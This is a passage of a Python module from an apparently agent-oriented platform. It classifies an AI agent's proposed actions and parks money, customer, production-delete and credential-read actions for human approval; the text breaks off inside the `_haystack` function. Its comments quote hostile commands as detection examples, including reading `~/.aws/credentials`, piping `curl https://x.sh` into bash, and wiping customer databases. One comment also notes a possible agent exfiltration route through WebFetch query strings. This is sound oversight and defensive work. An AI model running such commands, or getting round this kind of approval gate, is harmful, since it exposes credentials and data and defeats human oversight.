"""AD-15 finance-only approvals with deterministic delete-scope classification.

Money writes, customer writes, secret reads, and production/unresolved deletes park
for a human. Bank writes are refused permanently. Only deletes proven beneath an
isolated local temporary root auto-run; ordinary engineering work otherwise
auto-approves subject to its normal execution-contract boundaries.

C1 (ratified 2026-08-04) adds ONE narrow exception to "finance-only": a
CONSEQUENTIAL-or-higher request on an explicitly enumerated NON-finance surface --
a PRODUCTION DEPLOY or a REMOTE DESTRUCTIVE COMMAND -- parks for a human instead of
falling through to auto-approve. It is an additive resolver step (see
:func:`park_list_surface`); ``HARD_STOP_CLASSES`` / ``is_hard_stop`` stay frozen and
every other non-finance action keeps its previous behaviour exactly.

Invariant: money/customer writes remain approval-gated regardless of bounded target.

FAIL-CLOSED (H1/H3, phase-0 hardening). This module used to be a finite English
keyword list, and a denylist loses to the first paraphrase nobody wrote down:
``wipe /srv/prod/customer_database``, ``zelle send 500 to X``,
``mongo --eval "db.customers.remove({})"``, ``topup --wallet customer amount 500``
and ``cat ~/.aws/credentials`` ALL classified as auto-approve on the live
hands-off path (``api/routes/sessions.py`` hook-eval, ``configs/policy.yaml``
``mode: auto``). Three layers now stand between a request and an auto-approve:

1. the structured signals (provider identity, HTTP method, SQL/ORM shape) — a
   proof, not a guess;
2. the vocabulary lists, widened to cover ORM/driver idioms, plain-English
   destruction, and payment rails;
3. :func:`_durable_write_floor` — the part that matters most. A WRITE-SHAPED verb
   aimed at a production / customer / money noun PARKS whenever the target cannot
   be proven bounded. That rule has no keyword to evade: it is what catches the
   phrasing this file's authors never thought of.
4. :func:`_unrecognised_action_floor` (H4, LS-022) — the same floor with its VERB
   half INVERTED, because layer 3 is only ever as good as its verb list and
   ``reset the production database`` was not on it. On the money / customer /
   production surface an action must be RECOGNISED to auto-approve; an
   unrecognised one parks. Scoped to that surface on purpose — see the block
   comment above the function for what the wider scopes were measured to cost.

Uncertainty always resolves to "park", never to "approve".
"""

from __future__ import annotations

import inspect
import logging
import os
import re
import shlex
import tempfile
import threading
from collections.abc import Mapping
from pathlib import Path
from types import MappingProxyType
from typing import NamedTuple

from omniagentos.contracts import ActionClass
from omniagentos.orchestrator.contracts import (
    ApprovalDecision,
    ApprovalNotifier,
    ApprovalRequest,
    HardStop,
    TargetScope,
)
from omniagentos.path_containment import inode_relative_parts
from omniagentos.policy.secrets import references_secret, tool_input_references_secret
from omniagentos.policy.sqlcheck import is_additive_sql, looks_like_sql

LOG = logging.getLogger(__name__)

# Read-like classes suppress broad finance-keyword matches ("read payment ledger"),
# but explicit write/delete signals below still win over a stale or weak class.
_ALWAYS_SAFE_CLASSES: frozenset[str] = frozenset(
    {"read_only", "sandboxed_creation", "internal_reversible"}
)

# File-deletion signals — the second hard-stop class.
_DELETE_SIGNALS: tuple[str, ...] = (
    "rm -",
    "rm ",
    " rm",
    "rmdir",
    "unlink",
    "shred",
    "git rm",
    "drop table",
    "delete from",
    "delete file",
    "delete the file",
    "delete ",
    "remove file",
    "os.remove",
    "os.unlink",
    "shutil.rmtree",
    "rmtree",
    "rimraf",
    "truncate ",
    "trash ",
    "del ",
    # H1 -- plain-English destruction. The pre-hardening list only knew
    # "rm"/"delete"/"drop", so `wipe /srv/prod/customer_database` auto-approved.
    # These are anchored at a word START by _compile_signal_re, so "wipe" also
    # covers "wiped"/"wiping" without matching a suffix of an unrelated word.
    # Deliberately ABSENT: "scrub" (matches this repo's own `_scrubbed_env`
    # symbol in a test command) and "empty"/"clear" alone (ubiquitous in benign
    # engineering prose). Those verbs are carried by _durable_write_floor below,
    # where a production/customer/money noun must accompany them.
    "wipe",
    "erase",
    "purge",
    "obliterate",
    "nuke",
    "clear out",
    # H1 -- datastore destruction that is not "DROP TABLE".
    "drop collection",
    "drop_collection",
    "drop database",
    "drop schema",
    "truncate table",
    "flushall",
    "flushdb",
)

# ORM / driver spellings of a delete. A word-boundary matcher cannot anchor these
# (the discriminating character is the trailing "(" or a leading "."), so they are
# matched as plain substrings -- exactly like _SUBSTRING_DELETE_SIGNALS below.
#
# `mongo --eval "db.customers.remove({})"` auto-approved before this existed: an
# English-verb list has no entry for the way a driver actually spells destruction.
# ``\bdelete`` already covers deleteMany/deleteOne/.delete(/delete_all, so those
# are not repeated here.
_ORM_DELETE_SIGNALS: tuple[str, ...] = (
    "remove(",  # db.customers.remove({}) / collection.remove(...)
    "destroy(",  # ActiveRecord/Sequelize .destroy(...) / destroy_all(
    ".drop(",  # db.users.drop()
    "truncate(",  # session.truncate(...)
    "drop_collection(",
)

# Money / finance signals — the first hard-stop class.
_MONEY_SIGNALS: tuple[str, ...] = (
    "payment",
    "pay ",
    "transfer",
    "wire ",
    "withdraw",
    "refund",
    "charge ",
    "invoice",
    "stripe",
    "paypal",
    "venmo",
    " ach ",
    "bank ",
    "banking",
    "checkout",
    "purchase",
    "buy ",
    "spend",
    "send money",
    "move money",
    "payout",
    "wire transfer",
    "credit card",
    "debit",
    "subscription",
    "plaid",
    "braintree",
    # H1 -- payment RAILS the pre-hardening list omitted. `zelle send 500 to X`
    # and `topup --wallet customer amount 500` both auto-approved because no
    # entry above names the rail they move money over. _haystack normalizes
    # "-"/"_" to spaces, so "top-up"/"top_up" reach the "top up" alternative.
    "zelle",
    "cashapp",
    "cash app",
    "wallet",
    "topup",
    "top up",
    "chargeback",
    "disburse",
    "remittance",
)

# Bank writes are not satisfiable approvals. These patterns intentionally require
# a mutation verb; merely reading a bank statement is not a bank write.
_BANK_WRITE_RE = re.compile(
    r"(?:"
    r"\bbank(?:ing)?\b.{0,40}\b(?:transfer|wire|withdraw|deposit|debit|pay|send|move)\b"
    r"|"
    r"\b(?:transfer|wire|withdraw|deposit|debit|send|move)\b.{0,40}\b(?:bank|account)\b"
    r")"
)

# Customer writes / mass messaging are approval-bearing even when no money moves.
_CUSTOMER_WRITE_RE = re.compile(
    r"(?:"
    r"\bmass[\s_-]*(?:email|message|mail|sms)\b"
    r"|"
    r"\b(?:broadcast|blast)\b.{0,50}\b(?:customer|contact|subscriber|recipient)s?\b"
    r"|"
    r"\b(?:message|email|notify|text|send)\b.{0,40}\ball\s+"
    r"(?:customer|contact|subscriber)s?\b"
    r"|"
    r"\b(?:crm[\s_-]*)?(?:update|write|mutate|delete)\b.{0,30}\b"
    r"(?:customer|contact)s?\b"
    r"|"
    r"\bcustomer\.io\b.{0,60}\btrigger[\s_-]*broadcast\b"
    r"|"
    r"\b(?:post|put|patch|delete)\b.{0,80}\b"
    r"(?:customer|contact|subscriber|recipient)s?\b"
    r"|"
    # LSC-08. A DB CLI's operand IS the operation, and its executable name says
    # nothing about direction -- ``psql``/``sqlite3``/``mysql`` read and write
    # alike. The unrecognised-ACTION floor is the wrong instrument for it: SQL
    # ``UPDATE`` is a perfectly RECOGNISED verb everywhere else on this machine
    # (``npm update``, ``git update-index``, "update the docs"), so inverting on
    # it would park a large slice of ordinary work. A SQL write is a recognised
    # operation aimed at a named table, so it belongs here, in the write
    # vocabulary, which reads the command in full and only ever ADDS a park.
    #
    # ``accounts`` is included HERE and still excluded from the inverted floor's
    # ``_HIGH_VALUE_CUSTOMER_RE``: a positive match on real SQL syntax is a very
    # different bet from a bare noun arming an inverted rule. ``users`` stays out
    # of both -- every path on macOS is under ``/Users/``.
    #
    # The table name must be the NEXT token (past an optional schema prefix), so
    # ``npm update && cat accounts.md`` cannot match.
    r"\bupdate\s+[^\s;()]*\b(?:account|customer|subscriber|cardholder)s?\b[^;]{0,120}?\bset\b"
    r"|"
    r"\b(?:insert\s+into|replace\s+into|delete\s+from|truncate(?:\s+table)?|"
    r"alter\s+table|drop\s+table)\s+[^\s;()]*\b"
    r"(?:account|customer|subscriber|cardholder)s?\b"
    r")"
)

# Delete signals that start with a non-word character or span flag syntax -- the
# word-boundary compiler below cannot anchor these (\b never matches between a
# space and "-"), so they are matched as plain substrings. Each is specific
# enough not to fire on prose.
_SUBSTRING_DELETE_SIGNALS: tuple[str, ...] = (
    "-delete",  # find . -delete / rsync --delete
    "git clean -",  # git clean -fdx and friends
    "push --force",  # history rewrite
    "push -f",
    "dd of=",  # raw device/file overwrite
    "terraform destroy",
)

# Delete signals that are SQL-shaped: eligible for the additive-SQL downgrade
# (a purely-additive migration mentioning DROP only inside a comment is not a
# deletion). Everything else that hits a delete signal always parks.
_SQL_DELETE_SHAPES: frozenset[str] = frozenset({"drop table", "delete from", "truncate "})

# Env-dump shapes remain classified as secret reads for truthful audit, but AD-15
# no longer parks them. Bare `env`/`printenv` (alone or piped) trips; `env python x`
# (interpreter prefix idiom) does not.
_ENV_DUMP_RE = re.compile(
    r"(?:^|[;&|]\s*)(?:printenv\b|env\s*$|env\s*[|>]|export\s+-p\b|set\s*\|)",
    re.MULTILINE,
)

# --- H1 durable floor vocabulary ---------------------------------------------
# These are NOT another denylist of specific commands. They are the two halves of
# a SHAPE -- "something that mutates" aimed at "something that matters" -- which
# together, plus an unprovable target, park by default. A paraphrase that evades
# every literal signal above still has to be write-shaped and still has to name
# what it is acting on, and that is the property this floor keys on.
#
# Matched anywhere in the action text (unlike _WRITE_OPERATION_RE, which is
# ``^``-anchored because it classifies a structured operation NAME).
_DESTRUCTIVE_VERB_RE = re.compile(
    r"\b(?:wipe|erase|purge|obliterate|nuke|scrub|clear|empty|flush|drain|"
    r"truncate|delete|remove|destroy|drop|revoke|overwrite|expire|"
    r"deactivate|deprovision|decommission|teardown|tear down)\w*"
)
_VALUE_MOVE_VERB_RE = re.compile(
    r"\b(?:send|transfer|wire|withdraw|deposit|debit|credit|pay|payout|refund|"
    r"chargeback|charge|disburse|topup|top up|remit|settle|reimburse|"
    r"issue|move|convert)\w*"
)
# "prod" is included but is harmless alone: `vercel deploy --prod` carries no
# write-shaped verb, so the floor never sees it.
_PRODUCTION_NOUN_RE = re.compile(
    r"\b(?:prod|production|database|databases|db|table|tables|collection|"
    r"collections|schema|schemas|bucket|buckets|volume|volumes|namespace|"
    r"cluster|clusters|index|indices|indexes|dataset|datastore|warehouse|"
    r"backup|backups|snapshot|snapshots)\b"
)
# "user"/"users" is deliberately ABSENT: on macOS every absolute path is under
# ``/Users/<name>``, so it would make the noun half of the shape unconditionally
# true and turn the floor into a park-everything rule.
_CUSTOMER_NOUN_RE = re.compile(
    r"\b(?:customer|customers|client|clients|subscriber|subscribers|contact|"
    r"contacts|lead|leads|member|members|tenant|tenants|profile|profiles|"
    r"account|accounts)\b"
)
_MONEY_NOUN_RE = re.compile(
    r"\b(?:money|fund|funds|cash|payment|payments|payout|payouts|invoice|"
    r"invoices|balance|balances|wallet|wallets|ledger|card|cards|bank|treasury|"
    r"payroll|transaction|transactions|escrow|revenue|refund|refunds)\b"
)

# --- crypto rails (Sol review, blocker B) ------------------------------------
# `transfer 10 USDC to wallet` already parked on the "wallet" noun, but
# `send 0.5 ETH to 0xABC123` auto-approved: a ticker symbol is not a money noun,
# and the rail carries no bank/card/payment vocabulary at all.
#
# Tickers are matched with a boundary on BOTH sides, which is what keeps `eth`
# out of "ethernet"/"method" and `btc` unambiguous. Symbols that collide with an
# ordinary English word or with a name used in this repo -- ``sol`` (the
# ``sol-xhigh`` agent, which ``_haystack`` normalizes to "sol xhigh"), ``dot``,
# ``ada``, ``dai`` -- are matched ONLY when preceded by an amount, because a
# ticker in a money context effectively always is ("move 3 SOL", "0.5 ETH").
_CRYPTO_ASSET_RE = re.compile(
    r"\b(?:eth|btc|xbt|usdc|usdt|ltc|xrp|bnb|avax|matic|doge|"
    r"bitcoin|ethereum|solana|litecoin|dogecoin|stablecoin|satoshi|"
    r"crypto|cryptocurrency)\b"
    r"|\b\d+(?:\.\d+)?\s*(?:sol|dot|ada|dai)\b"
)
# A bare on-chain address is the DURABLE half of this rule: a token list cannot
# keep up with new symbols, but a payout has to name a destination. Scoped to
# ``0x`` + exactly 40 hex chars so neither a 40-char git SHA (no ``0x`` prefix)
# nor a short ``0xdeadbeef`` debug literal can match.
_CRYPTO_ADDRESS_RE = re.compile(r"\b0x[0-9a-f]{40}\b")


# --- named payment rails (Sol review, round 2) -------------------------------
# A rail NAME was never a money noun, so a rail move parked only when some OTHER
# word happened to be present: `initiate SEPA transfer 1000 EUR` parked on
# "transfer" and `SEPA send 1000 EUR to account DE89…` parked on "account", while
# the complete, realistic `SEPA send 1000 EUR` and `send 1000 EUR via Interac`
# auto-approved. Coincidental coverage is not coverage.
#
# Bounded on BOTH sides, which is what makes them safe to carry: ``\bswift\b``
# cannot fire inside "swiftly", ``\bpix\b`` cannot fire inside "pixel"/"pixmaps",
# ``\bsepa\b`` cannot fire inside "separate", and ``\binterac\b`` cannot fire
# inside "interact". They are money NOUNS, never bare signals, so `swift build`
# and `grep -r "IBAN" docs/` carry no value-move verb and stay hands-off.
# ``wise`` is bounded on BOTH sides, which is exactly what keeps it out of
# "otherwise", "wisely", "pairwise" and "likewise" -- in every one of those the
# character before or after ``wise`` is a word character, so no boundary exists.
_PAYMENT_RAIL_RE = re.compile(
    r"\b(?:sepa|interac|pix|bacs|chaps|swift|iban|bic|rtgs|neft|imps|upi|"
    r"wise|alipay|wechat pay|revolut|payoneer|remitly|western union|moneygram|"
    r"faster payments|sort code|routing number)\b"
)

# An amount in a currency IS a sum of money regardless of the rail. Bare currency
# codes are far too collision-prone to carry alone, so a preceding AMOUNT is
# required -- the same discipline the collision-prone crypto tickers use. This is
# what parks `send 1000 EUR`, which names no rail at all.
_CURRENCY_AMOUNT_RE = re.compile(
    r"\b\d[\d,]*(?:\.\d+)?\s*"
    r"(?:usd|eur|gbp|jpy|chf|cad|aud|nzd|brl|mxn|inr|cny|sek|nok|dkk|pln|zar|"
    r"hkd|sgd|krw|try|aed|rub|ils|thb|php|idr)\b"
)

# A currency SYMBOL glued to an amount. ``move €1000`` slipped through the code
# form above because that pattern needs ``\b`` before the digits and ``€`` is not
# a word character, so no boundary exists between them.
#
# A SHELL VARIABLE REFERENCE IS NOT MONEY. ``$1``/``$0`` (positional parameters)
# and ``$3`` (an awk field) are the single most common ``$``-plus-digits shapes in
# a real command, so the amount must be two or more digits, or carry a decimal /
# thousands separator. That admits $99, €1000, £250, ¥100000 and €1,250.50 while
# excluding every single-digit reference.
_CURRENCY_SYMBOL_AMOUNT_RE = re.compile(r"[€£¥$]\s?(?:\d{2,}[\d.,]*|\d[.,][\d.,]*)")


def _names_money(text: str) -> bool:
    """True when the action names something denominated in value."""
    return (
        _MONEY_NOUN_RE.search(text) is not None
        or _CRYPTO_ASSET_RE.search(text) is not None
        or _CRYPTO_ADDRESS_RE.search(text) is not None
        or _PAYMENT_RAIL_RE.search(text) is not None
        or _CURRENCY_AMOUNT_RE.search(text) is not None
        or _CURRENCY_SYMBOL_AMOUNT_RE.search(text) is not None
    )


# --- inert text: a name is not an action -------------------------------------
# This module already refuses to scan a file's ``content``/``new_string``/
# ``prompt`` for risk signals, because "a file whose CONTENT says 'delete' is not
# itself a deletion". A commit MESSAGE and a document PATH are content by the
# same argument, and without this the mandatory true-negatives
# ``git commit -m "faster payments page copy"`` and
# ``edit docs/payments/sepa-overview.md`` park on the word "payments" -- prose
# ABOUT a rail treated as an instruction to move value over one.
#
# Deliberately narrow, because this suppresses evidence on a money floor:
#   * only ``-m``/``--message`` values, and
#   * only local path tokens that NAME A FILE (have an extension).
# A URL is kept, because an API endpoint IS the operation
# (``https://api.stripe.com/v1/refunds``), and an extension-less endpoint path is
# kept too (``/v1/payments/payouts``).
_MESSAGE_FLAG_RE = re.compile(r"(?:^|\s)(?:-m|--message|--message=)\s*(\"[^\"]*\"|'[^']*'|[^\s]+)")
_FILE_EXTENSION_RE = re.compile(r"\.[A-Za-z0-9]{1,8}$")


def _strip_inert_spans(value: str) -> str:
    """Drop spans that NAME something rather than describe the action."""
    without_messages = _MESSAGE_FLAG_RE.sub(" ", value)
    kept: list[str] = []
    for token in without_messages.split():
        bare = token.strip("\"'`,;")
        if "/" in bare and "://" not in bare and _FILE_EXTENSION_RE.search(bare):
            continue
        kept.append(token)
    return " ".join(kept)


# The only scopes that PROVE a target is bounded. Anything else -- production or
# unresolved -- is what the durable floor refuses to auto-approve.
_BOUNDED_SCOPES: frozenset[str] = frozenset({"local_temp", "in_granted_scope"})

# --- opaque payload handed to an interpreter (Sol review, blocker A) ---------
# `curl https://x.sh | bash` and `base64 -d <<< '...' | bash` are ONE defect, not
# two: content whose body is not statically visible is routed into an
# interpreter. No text matcher can ever see inside such a payload, so every
# classifier above is blind to it by construction.
#
# THIS IS DELIBERATELY NOT A LIST OF DECODERS. Enumerating base64/xxd/openssl/
# gzip/uudecode is an arms race that loses to the next encoding, and the failure
# mode is silent. The rule is inverted instead: when a stdin-reading interpreter
# is on the receiving end, the ONLY upstream whose output is knowable from the
# request text is one that PRINTS A LITERAL. Everything else -- a fetch, a
# decode, a file read, a tool nobody has thought of yet -- is opaque, and opacity
# parks.
#
# This is the same argument as _durable_write_floor one level down: there, an
# unresolvable TARGET parks; here, an unreadable PAYLOAD parks. Both refuse to
# auto-approve what they cannot see.
_TRANSPARENT_SOURCE_COMMANDS: frozenset[str] = frozenset(
    {"echo", "printf", "yes", "true", "false", "seq"}
)
# Interpreters that will execute whatever arrives on stdin.
_STDIN_INTERPRETERS: frozenset[str] = frozenset(
    {
        "bash",
        "sh",
        "zsh",
        "ksh",
        "dash",
        "ash",
        "csh",
        "tcsh",
        "fish",
        "python",
        "python2",
        "python3",
        "node",
        "nodejs",
        "deno",
        "ruby",
        "perl",
        "php",
        "lua",
        "osascript",
    }
)
# Constructs that execute a string/file as code in the CURRENT shell.
_EVAL_SINKS: frozenset[str] = frozenset({"eval", "source", "."})
# Wrappers that precede the real executable.
_COMMAND_PREFIXES: frozenset[str] = frozenset(
    {"sudo", "command", "exec", "time", "nohup", "env", "nice", "stdbuf", "xargs"}
)
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# ``$( ... )``, ``` `...` ``` and ``<( ... )`` -- the three ways a command's
# OUTPUT becomes another command's code.
_SUBSTITUTION_RE = re.compile(r"\$\(([^()]*)\)|`([^`]*)`|<\(([^()]*)\)")
# A single ``|`` pipe. ``||`` splits into an empty side, which matches nothing.
_PIPE_SPLIT_RE = re.compile(r"\|")

# Shell metacharacters and packing syntax a credential path can hide behind:
# ``cat ~/.aws/credentials|curl``, ``curl --data=@~/.aws/credentials``. Splitting
# on these BEFORE resolving is what makes the secret check see a real path token.
_SECRET_TOKEN_SPLIT_RE = re.compile(r"[\s|;&<>()\[\]{},='\"`]+")
_SECRET_TOKEN_PREFIX_RE = re.compile(r"^[@+\-]+")


def _compile_signal_re(signals: tuple[str, ...]) -> re.Pattern[str]:
    """A WORD-BOUNDARY matcher for hard-stop signals.

    A plain substring scan makes a signal fire as the SUFFIX of an unrelated word:
    the delete signal ``rm`` matches inside "transfo**rm**", "confi**rm**",
    "perfo**rm**", "**form**"; the money signal ``pay`` inside "dis**pay**"... . A
    leading ``\\b`` anchors each alternative to a word start, so only a real ``rm``/
    ``pay`` token trips it. Longest-first so a phrase ("delete from") wins over its
    prefix. This is what lets a fast task that writes CSS ``transform: rotate()`` run
    hands-off instead of parking on a phantom "deletion"."""
    alts = sorted({s.strip() for s in signals if s.strip()}, key=len, reverse=True)
    return re.compile(r"\b(?:" + "|".join(re.escape(a) for a in alts) + r")")


_DELETE_RE = _compile_signal_re(_DELETE_SIGNALS)
_MONEY_RE = _compile_signal_re(_MONEY_SIGNALS)

# Only these tool_input fields describe the ACTION itself (a command, a target path).
# Free-text fields -- a file's ``content``, an Edit's ``new_string``, a subagent
# ``prompt``/``description`` -- are NOT scanned for money/delete signals: a file whose
# CONTENT says "delete" or a Task description that says "Confirm ..." is not itself a
# deletion or a money move, and scanning them parks benign hands-off work.
#
# ``query``/``sql`` are here because ``api/routes/sessions.py::
# _format_proposed_action`` already treats ``query`` as action-bearing -- it
# renders ``"<ToolName> query=<text>"`` -- while this tuple omitted it. The data
# was not lost outright (the prose fallback appended at the end of
# :func:`_haystack` recovered it), but a structured field degraded into a
# ``"query=…"`` text blob is exactly the carrier mismatch the rest of these
# findings are about: it breaks the moment the prose fallback is removed, and it
# defeats every ``^``-anchored operation pattern. One side of a pair knew about
# ``query``; the other did not.
_ACTION_INPUT_KEYS: tuple[str, ...] = (
    "command",
    "cmd",
    "script",
    "query",
    "sql",
    "statement",
    "method",
    "http_method",
    "operation",
    "action",
    "file_path",
    "path",
    "notebook_path",
    "filename",
    "file",
    "target",
    "destination",
    "url",
    "endpoint",
    "payload",
    "body",
    "data",
    "json",
    "params",
)

_STRUCTURED_CONTAINER_KEYS: frozenset[str] = frozenset(
    {"payload", "body", "data", "json", "params"}
)
_NON_ACTION_PAYLOAD_KEYS: frozenset[str] = frozenset(
    {"content", "new_string", "old_string", "prompt", "description", "notes"}
)
_READ_HTTP_METHODS: frozenset[str] = frozenset({"get", "head", "options"})
_WRITE_HTTP_METHODS: frozenset[str] = frozenset({"post", "put", "patch", "delete"})
_READ_OPERATION_RE = re.compile(
    r"^(?:get|list|read|retrieve|fetch|search|inspect|query|lookup|summari[sz]e|ledger)\b"
)
# ``reset``/``truncate``/``drop``/``purge``/``wipe`` are the LS-022 verbs: they were
# in none of the write vocabularies, which is how ``reset_db`` reached the
# classifier's fall-through in the first place. Here they are cheap and safe --
# this pattern is ``^``-anchored and only ever classifies a STRUCTURED operation
# NAME (``tool_input["operation"]``), never free text.
_WRITE_OPERATION_RE = re.compile(
    r"^(?:create|upsert|update|write|mutate|delete|send|broadcast|publish|trigger|"
    r"transfer|wire|withdraw|deposit|debit|pay|payout|refund|charge|"
    r"reset|truncate|drop|purge|wipe|erase|flush|restore)\b"
)
_CUSTOMER_RECORD_RE = re.compile(
    r"\b(?:customer|contact|profile|person|people|lead|subscriber|recipient)s?\b"
)
_MESSAGE_OPERATION_RE = re.compile(
    r"\b(?:send|broadcast|blast|bulk|batch|mass)\b.{0,40}\b"
    r"(?:email|mail|sms|text|message|notification)s?\b"
)
_BANK_PROVIDERS: frozenset[str] = frozenset({"teller", "slash"})
_CUSTOMER_RECORD_PROVIDERS: frozenset[str] = frozenset(
    {"customerio", "hubspot", "salesforce", "piedpiper"}
)
_MESSAGE_PROVIDERS: frozenset[str] = frozenset(
    {
        "customerio",
        "gmail",
        "hubspot",
        "mailchimp",
        "sendgrid",
        "twilio",
    }
)
# ``webfetch``/``websearch`` are here on the same argument as ``get`` is in
# ``_READ_HTTP_METHODS``: fetching a URL and querying a search index are reads by
# construction, whatever words the URL or the query happens to contain. They were
# previously covered by an escape that declared any tool-label line RECOGNISED,
# which cleared this floor for EVERY non-Bash tool (LSC-02a). The remedy belongs
# here, where it is a statement about those two tools and nothing else.
#
# OPEN, UNVERIFIED, AND DELIBERATELY NOT ACTED ON HERE. A cross-lineage review
# (Gemini 3.1 Pro, GCV round 3) argued ``WebFetch`` is not only a read: a URL is
# attacker-composable, so an agent could EXFILTRATE by putting text in the query
# string of a fetch aimed at a host it controls, on a floor whose whole job is
# production / money / customer surfaces. NO REPRO WAS SUPPLIED and the reviewer
# scoped the claim to reasoning rather than execution, so it is recorded as a
# concern and not as a finding -- acting on an unproven claim here is how this
# module acquired two provably false comments already.
# What IS measured, against a prior lane base over 75,289 real tool calls:
# these two entries together un-park 48 calls on the high-value surface --
# 35 ``WebSearch`` and 13 ``WebFetch``. That is the size of the decision the
# concern would reopen, and it is the whole of this lane's un-park count.
_TRUSTED_READ_TOOLS: frozenset[str] = frozenset(
    {"read", "grep", "glob", "search", "lookup", "webfetch", "websearch"}
)

_PATH_INPUT_KEYS: frozenset[str] = frozenset(
    {"file_path", "path", "notebook_path", "filename", "file", "target", "destination"}
)

_DELETE_COMMANDS: frozenset[str] = frozenset(
    {"rm", "rmdir", "unlink", "shred", "trash", "rimraf", "truncate"}
)

_SHELL_OPERATORS: frozenset[str] = frozenset({";", "&&", "||", "|", ">", ">>", "<", "2>", "2>>"})

_ABSOLUTE_PATH_RE = re.compile(r"(?<![\w$])(/[^ \t\r\n;&|<>'\"]+)")
_PYTHON_DELETE_PATH_RE = re.compile(
    r"(?:os\.(?:remove|unlink)|shutil\.rmtree|rmtree)\(\s*(['\"])(.*?)\1"
)
_REMOTE_COMMAND_RE = re.compile(
    r"(?:"
    r"(?:^|[;&|]\s*)(?:ssh|mosh)\b"
    r"|"
    r"\b(?:kubectl|docker|podman)\s+exec\b"
    r"|"
    r"\bgcloud\s+compute\s+ssh\b"
    r"|"
    r"\baws\s+ssm\s+send-command\b"
    r")"
)


def _is_remote_command(command: str) -> bool:
    """Recognize remote execution locally; approval scope never imports shell policy."""
    return _REMOTE_COMMAND_RE.search(command.lower()) is not None


def _path_scope(raw_path: str) -> TargetScope:
    """Classify one literal path without expanding user-controlled shell syntax."""
    value = raw_path.strip().strip("'\"").rstrip(",);")
    if not value:
        return "unresolved"
    if value in {"~", "$HOME", "${HOME}"} or value.startswith(("~/", "$HOME/", "${HOME}/")):
        return "production"
    if "\x00" in value or any(marker in value for marker in ("$", "`")):
        return "unresolved"

    path = Path(value)
    if not path.is_absolute():
        return "unresolved"

    normalized_text = os.path.normpath(value)
    temp_roots = {
        tempfile.gettempdir(),
        "/tmp",
        "/private/tmp",
    }
    for root in temp_roots:
        # The temp root itself is not an isolated target. Only a strict
        # descendant proved through the shared inode primitive is bounded
        # enough to auto-delete. A symlink beneath a temp spelling that lands
        # outside therefore fails closed as production.
        parts = inode_relative_parts(normalized_text, root)
        if parts:
            return "local_temp"
    return "production"


# Destructive shapes that never have a literal local-temp target. These fail
# closed as production rather than unresolved so audit scope is decisive.
_ALWAYS_PRODUCTION_DELETE_SIGNALS: tuple[str, ...] = (
    "drop table",
    "delete from",
    "git clean -",
    "push --force",
    "push -f",
    "terraform destroy",
    "dd of=",
    # H1 -- a datastore/ORM delete has no filesystem operand at all, so it can
    # never be proven local-temp. Failing it closed as production (rather than
    # letting it land on "unresolved") keeps the audit scope decisive.
    "drop collection",
    "drop database",
    "drop schema",
    "truncate table",
    "flushall",
    "flushdb",
    "remove(",
    "destroy(",
    ".drop(",
    "truncate(",
    "drop_collection(",
)


def _delete_targets(command: str) -> tuple[list[str], bool]:
    """Extract literal targets from recognized destructive command shapes."""
    lowered = command.lower()
    if _is_remote_command(command):
        return [], True
    if any(signal in lowered for signal in _ALWAYS_PRODUCTION_DELETE_SIGNALS):
        return [], True

    python_targets = [match.group(2) for match in _PYTHON_DELETE_PATH_RE.finditer(command)]
    if python_targets:
        return python_targets, True

    try:
        tokens = shlex.split(command, posix=True)
    except ValueError:
        return [], True

    targets: list[str] = []
    recognized = False
    for index, token in enumerate(tokens):
        command_name = Path(token).name.lower()
        if command_name in _DELETE_COMMANDS:
            recognized = True
            for operand in tokens[index + 1 :]:
                if operand in _SHELL_OPERATORS:
                    break
                if operand == "--" or operand.startswith("-"):
                    continue
                targets.append(operand)
            continue
        if command_name == "git" and index + 1 < len(tokens) and tokens[index + 1] == "rm":
            recognized = True
            for operand in tokens[index + 2 :]:
                if operand in _SHELL_OPERATORS:
                    break
                if operand == "--" or operand.startswith("-"):
                    continue
                targets.append(operand)
            continue
        if command_name == "find" and "-delete" in tokens[index + 1 :]:
            recognized = True
            operands = [
                operand
                for operand in tokens[index + 1 :]
                if not operand.startswith("-") and operand not in _SHELL_OPERATORS
            ]
            if operands:
                targets.append(operands[0])
            continue
        if command_name == "rsync" and any(
            operand == "--delete" or operand.startswith("--delete-")
            for operand in tokens[index + 1 :]
        ):
            recognized = True
            operands = [
                operand
                for operand in tokens[index + 1 :]
                if not operand.startswith("-") and operand not in _SHELL_OPERATORS
            ]
            if operands:
                targets.append(operands[-1])

    if not targets and recognized:
        return [], True
    if not recognized:
        targets.extend(match.group(1) for match in _ABSOLUTE_PATH_RE.finditer(command))
    return targets, recognized


def classify_target_scope(path_or_command: str) -> TargetScope:
    """Return the deterministic AD-15 scope for a delete path or command.

    Only literal absolute targets strictly below a known isolated temp root are
    ``local_temp``. Any production target dominates; missing/relative/dynamic targets
    fail closed as ``unresolved``. Always-destructive unscoped shapes (git clean,
    terraform destroy, SQL DROP/DELETE, force-push, dd) fail closed as ``production``.
    """
    value = str(path_or_command or "").strip()
    if not value:
        return "unresolved"

    lowered = value.lower()
    if _is_remote_command(value) or any(
        signal in lowered for signal in _ALWAYS_PRODUCTION_DELETE_SIGNALS
    ):
        return "production"

    delete_targets, destructive_without_local_target = _delete_targets(value)
    if delete_targets:
        scopes = [_path_scope(target) for target in delete_targets]
        if "production" in scopes:
            return "production"
        if "unresolved" in scopes:
            return "unresolved"
        return "local_temp"
    if destructive_without_local_target:
        # Recognized delete command with no extractable operand (e.g. bare ``rm -rf``).
        return "unresolved"
    return _path_scope(value)


def _structured_action_parts(request: ApprovalRequest, *, strip_inert: bool = False) -> list[str]:
    """Extract action-bearing structured fields before consulting prose labels."""
    parts = [request.tool_name or ""]
    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping):
        for key in _ACTION_INPUT_KEYS:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                parts.append(_strip_inert_spans(value) if strip_inert else value)
            elif isinstance(value, list | tuple):
                parts.extend(str(item) for item in value)
            elif key in _STRUCTURED_CONTAINER_KEYS and isinstance(value, Mapping):
                for nested_key, nested_value in value.items():
                    nested_name = str(nested_key).lower()
                    if nested_name in _NON_ACTION_PAYLOAD_KEYS:
                        continue
                    parts.append(nested_name)
                    if isinstance(nested_value, str | int | float | bool):
                        parts.append(str(nested_value))
    return parts


def _haystack(request: ApprovalRequest, *, strip_inert: bool = False) -> str:
    """Action text with structured tool inputs first and proposal prose last.

    ``strip_inert`` drops commit-message values and file-naming path tokens; it is
    used ONLY for the money floors, where a name must not read as an instruction.
    Every other classifier keeps the full text.
    """
